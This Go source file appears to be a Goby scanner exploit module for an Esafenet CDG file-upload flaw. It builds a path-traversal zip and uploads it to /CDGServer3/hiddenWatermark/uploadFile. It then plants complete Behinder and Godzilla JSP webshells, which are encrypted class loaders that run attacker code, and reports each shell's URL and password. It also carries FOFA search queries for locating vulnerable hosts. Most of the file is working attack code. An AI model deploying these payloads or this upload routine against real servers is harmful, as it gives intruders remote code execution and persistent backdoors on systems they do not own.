package exploits

import (
	"archive/zip"
	"bytes"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Esafenet Electronic Document Security Management System hiddenWatermark/uploadFile File Upload Vulnerability",
    "Description": "<p>Esafenet Electronic Document Security Management System (CDG) is an electronic document security encryption software that utilizes transparent encryption technology at the driver layer. By encrypting and protecting electronic documents, the system prevents internal employees from leaking information and external personnel from illegally stealing important data assets of the enterprise. It provides full lifecycle protection for electronic documents, and the system has multiple encryption methods such as transparent encryption, active encryption, and intelligent encryption, Users can deploy gradient document encryption protection with varying degrees of intensity according to the different levels of departmental confidentiality (such as core departments and ordinary departments), achieving an organic combination of technology, management, and auditing, and building a three-dimensional overall information leakage prevention system internally, achieving a balance between cost, efficiency, and security, and achieving data security of electronic documents.</p><p>The Esafenet electronic document security management system has a File Upload vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2024-01-23",
    "PostTime": "2024-01-23",
    "Author": "r4v3zn",
    "FofaQuery": "body=\"CDGServer3\" || title=\"电子文档安全管理系统\" || cert=\"esafenet\" || body=\"/help/getEditionInfo.jsp\"",
    "GobyQuery": "body=\"CDGServer3\" || title=\"电子文档安全管理系统\" || cert=\"esafenet\" || body=\"/help/getEditionInfo.jsp\"",
    "Level": "3",
    "Impact": "<p>The Esafenet electronic document security management system has a File Upload vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.esafenet.com/dzwdaqglxt\">https://www.esafenet.com/dzwdaqglxt</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98xx765X.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全管理系统 hiddenWatermark/uploadFile 文件上传漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。<br></p><p>亿赛通电子文档安全管理系统存在文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.esafenet.com/dzwdaqglxt\" target=\"_blank\">https://www.esafenet.com/dzwdaqglxt</a></p>",
            "Impact": "<p>亿赛通电子文档安全管理系统存在文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Esafenet Electronic Document Security Management System hiddenWatermark/uploadFile File Upload Vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>Esafenet Electronic Document Security Management System (CDG) is an electronic document security encryption software that utilizes transparent encryption technology at the driver layer. By encrypting and protecting electronic documents, the system prevents internal employees from leaking information and external personnel from illegally stealing important data assets of the enterprise. It provides full lifecycle protection for electronic documents, and the system has multiple encryption methods such as transparent encryption, active encryption, and intelligent encryption, Users can deploy gradient document encryption protection with varying degrees of intensity according to the different levels of departmental confidentiality (such as core departments and ordinary departments), achieving an organic combination of technology, management, and auditing, and building a three-dimensional overall information leakage prevention system internally, achieving a balance between cost, efficiency, and security, and achieving data security of electronic documents.</p><p>The Esafenet electronic document security management system has a File Upload vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.esafenet.com/dzwdaqglxt\" target=\"_blank\">https://www.esafenet.com/dzwdaqglxt</a></p>",
            "Impact": "<p>The Esafenet electronic document security management system has a File Upload vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10910"
}`

	uploadFileFlagtkJC0oW := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		var inMemoryZip bytes.Buffer
		zipWriter := zip.NewWriter(&inMemoryZip)
		// 将文件头写入zip文件
		writer, err := zipWriter.CreateHeader(&zip.FileHeader{
			Name:   `../../../js/` + filename,
			Method: zip.Deflate,
		})
		if err != nil {
			return nil, err
		}
		// 将内容写入zip文件
		_, err = writer.Write([]byte(content))
		// 关闭zip文件
		err = zipWriter.Close()
		if err != nil {
			return nil, fmt.Errorf("关闭zip文件失败: %v", err)
		}
		uploadRequestConfig := httpclient.NewPostRequestConfig(`/CDGServer3/hiddenWatermark/uploadFile`)
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.FollowRedirect = false
		uploadRequestConfig.Header.Store(`Content-Type`, `multipart/form-data; boundary=--------------------------684179547706019959479062`)
		uploadRequestConfig.Data = "----------------------------684179547706019959479062\n\nContent-Disposition: form-data; name=\"doc\"; filename=\"z.zip\"\r\nContent-Type: application/zip\r\n\r\n" + inMemoryZip.String() + "\r\n----------------------------684179547706019959479062--\r\n"
		if _, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig); err != nil {
			return nil, err
		}
		checkRequestConfig := httpclient.NewGetRequestConfig(`/CDGServer3/js/` + filename)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			filename := goutils.RandomHexString(16) + ".jsp"
			checkString := goutils.RandomHexString(6)
			content := `<% out.println("` + checkString + `");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>`
			resp, _ := uploadFileFlagtkJC0oW(hostInfo, filename, content)
			success := resp != nil && strings.Contains(resp.RawBody, checkString)
			if success {
				stepLogs.VulURL = hostInfo.FixedHostInfo + `/CDGServer3/hiddenWatermark/uploadFile`
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			var content string
			filename := goutils.RandomHexString(10) + ".jsp"
			if attackType == "behinder" {
				content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
			} else if attackType == "godzilla" {
				content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
			} else if attackType == "custom" {
				content = goutils.B2S(ss.Params["content"])
				filename = goutils.B2S(ss.Params["filename"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			if resp, err := uploadFileFlagtkJC0oW(expResult.HostInfo, filename, content); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
				if attackType == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if attackType == "godzilla" {
					expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: jsp\n"
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
